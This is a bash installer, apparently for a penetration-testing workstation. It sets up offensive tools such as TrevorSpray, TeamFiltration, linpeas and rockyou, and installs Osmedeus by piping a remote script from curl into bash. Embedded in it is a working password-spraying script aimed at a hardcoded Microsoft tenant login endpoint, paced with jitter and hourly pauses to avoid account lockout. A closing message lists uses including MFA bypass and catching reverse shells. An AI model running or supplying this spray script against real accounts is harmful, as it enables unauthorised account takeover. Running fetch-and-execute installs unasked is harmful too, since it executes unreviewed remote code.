#!/bin/bash

# Create Tools directory
TOOLS_DIR="/root/Desktop/Tools"
mkdir -p $TOOLS_DIR

# Add Sublime Text repository and update
wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/sublimehq-archive.gpg > /dev/null
echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list

# Update package list and upgrade system
sudo apt-get update -y && sudo apt-get upgrade -y

# Update database
sudo updatedb

# Install tools and dependencies
sudo apt-get install -y golang
sudo apt-get install -y remmina
sudo apt-get install -y seclists
sudo apt-get install -y netexec
sudo apt-get install -y gobuster
sudo apt-get install -y rlwrap
sudo apt-get install -y nuclei
sudo apt-get install -y zenity

# Install the latest version of nuclei using go
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Install Haiti-Hash gem
sudo gem install haiti-hash

# Install Sublime Text
sudo apt-get install -y sublime-text

# Install asnmap
wget https://github.com/projectdiscovery/asnmap/releases/download/v1.1.0/asnmap_1.1.0_linux_amd64.zip
unzip asnmap_1.1.0_linux_amd64.zip -d $TOOLS_DIR
sudo mv $TOOLS_DIR/asnmap /usr/local/bin/
rm $TOOLS_DIR/asnmap_1.1.0_linux_amd64.zip $TOOLS_DIR/LICENSE $TOOLS_DIR/README.md

# Install RustScan
wget https://github.com/RustScan/RustScan/releases/download/2.2.3/rustscan_2.2.3_amd64.deb
sudo dpkg -i rustscan_2.2.3_amd64.deb
rm rustscan_2.2.3_amd64.deb

# Clone and set up SploitScan
git clone https://github.com/xaitax/SploitScan.git $TOOLS_DIR/SploitScan
cd $TOOLS_DIR/SploitScan
pip install -r requirements.txt
chmod +x sploitscan.py
cd $TOOLS_DIR

# Clone and set up Meta-Detector
git clone https://github.com/stolenusername/Meta-Detector.git $TOOLS_DIR/Meta-Detector
cd $TOOLS_DIR/Meta-Detector
go build meta-detector.go
./meta-detector -download
cd $TOOLS_DIR

# Install TrevorProxy and TrevorSpray
pip install git+https://github.com/blacklanternsecurity/trevorproxy
pip install git+https://github.com/blacklanternsecurity/trevorspray

# Install TeamFiltration
wget https://github.com/Flangvik/TeamFiltration/releases/download/v3.5.4/TeamFiltration-v3.5.4-linux-x86_64.zip -P $TOOLS_DIR
unzip $TOOLS_DIR/TeamFiltration-v3.5.4-linux-x86_64.zip -d $TOOLS_DIR
mkdir $TOOLS_DIR/Spray
mv $TOOLS_DIR/TeamFiltration $TOOLS_DIR/TeamFiltrationConfig_Example.json $TOOLS_DIR/Spray
chmod +x $TOOLS_DIR/Spray/TeamFiltration

# Install CrossLinked
git clone https://github.com/m8sec/crosslinked $TOOLS_DIR/crosslinked
cd $TOOLS_DIR/crosslinked
pip3 install .

# Clone Trickest Wordlists
git clone https://github.com/trickest/wordlists.git $TOOLS_DIR/wordlists

# Install Osmedeus
bash <(curl -fsSL https://raw.githubusercontent.com/osmedeus/osmedeus-base/master/install.sh)

# Install DPAT (Domain Password Audit Tool)
git clone https://github.com/clr2of8/DPAT.git $TOOLS_DIR/DPAT
cd $TOOLS_DIR/DPAT
pip3 install -r requirements.txt

# Download linpeas.sh
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -P $TOOLS_DIR
chmod +x $TOOLS_DIR/linpeas.sh

# Download subdomains list
wget https://gist.githubusercontent.com/jhaddix/86a06c5dc309d08580a018c66354a056/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt -O $TOOLS_DIR/subdomains.txt

# Unzip rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz

# Create TrevorSpray Script
cat <<'EOL' > $TOOLS_DIR/trevorspray_script.sh
#!/bin/bash

# Variables
EMAIL_FILE="/root/.trevorspray/existent_users.txt"
PASSWORD_FILE="/root/Desktop/pass.txt"
URL="https://login.windows.net/28fae3fa-aaae-4ce5-909a-d8f7e460584a/oauth2/token"
DELAY=5               # Fixed delay in seconds between attempts (used within trevorspray)
JITTER=3              # Jitter in seconds
HOUR_DELAY=3600       # 1 hour in seconds
LOG_FILE="/root/Desktop/trevorspray_log.txt"

# Read usernames and passwords into arrays
usernames=($(cat "$EMAIL_FILE"))
passwords=($(cat "$PASSWORD_FILE"))

# Function to generate a random delay with jitter
function random_delay() {
  local delay=$1
  local jitter=$2
  echo $(( delay + (RANDOM % jitter) ))
}

# Start logging
exec > >(tee -i "$LOG_FILE") 2>&1

# Loop through passwords in pairs
for ((i = 0; i < ${#passwords[@]}; i+=2)); do
  echo "Starting password spray with passwords: ${passwords[i]} and ${passwords[i+1]}"
  
  # Loop through each user for the current pair of passwords
  for username in "${usernames[@]}"; do
    for ((j = i; j < i + 2 && j < ${#passwords[@]}; j++)); do
      password="${passwords[j]}"
      echo "Attempting login for user: $username with password: $password"
      
      # Execute TrevorSpray command
      trevorspray -u "$username" -p "$password" --url "$URL" --delay "$DELAY" -j "$JITTER"
      
      # Wait for the delay with jitter before the next password attempt
      delay=$(random_delay "$DELAY" "$JITTER")
      echo "Waiting for $delay seconds before the next password attempt..."
      sleep "$delay"
    done
  done
  
  # Wait for an hour before moving to the next pair of passwords
  echo "Waiting for $HOUR_DELAY seconds before moving to the next pair of passwords..."
  sleep "$HOUR_DELAY"
done

echo "Password spraying completed."
EOL

# Make the TrevorSpray script executable
chmod +x $TOOLS_DIR/trevorspray_script.sh

# Clean up
rm $TOOLS_DIR/TeamFiltration-v3.5.4-linux-x86_64.zip tools.sh

# Display notification
zenity --info --text='Installation complete!\n\n- Use Sublime Text with "subl" to edit codes and scripts\n- Use remmina to interact with RDP sessions\n- Use seclists for dictionaries\n- Use netexec in place of crackmapexec (internal pentest)\n- Use gobuster, dirbuster, dirb, ffuf for directory and subdomain brute-forcing\n- Use rlwrap for listening back shells with "rlwrap netcat" for better CLI\n- Use nuclei for extra automated vulnerability scanning\n- Use haiti-hash with "haiti <hash>" for identifying hashes\n- Use asnmap for identifying ASN of companies\n- Use rustscan in place of nmap for faster scanning\n- Use SploitScan to check CVE details\n- Use Meta-Detector for automated Google dorking against company domains\n- Use TeamFiltration for enumerating company emails and password spraying against O365 accounts, use Windows version as well\n- Use TrevorSpray for password spraying against O365 accounts\n- Use MFASweep against valid O365 accounts for MFA Bypass\n- Use CrossLinked to find emails against domains and check validation with TrevorSpray\n- Use TrevorSpray script to automate 3 password sprays with intervals a day\n- Use Osmedeus for automated recon and vulnerability scanning\n- Use Trickest wordlists for wordlists and dictionaries\n- Use DPAT (Domain Password Audit Tool) for domain password auditing\n- Use linpeas.sh for Linux privilege escalation enumeration\n- Use subdomains.txt for subdomain enumeration\n- Rockyou.txt is decompressed and ready for use.'

echo "All tools and applications installed successfully in $TOOLS_DIR!"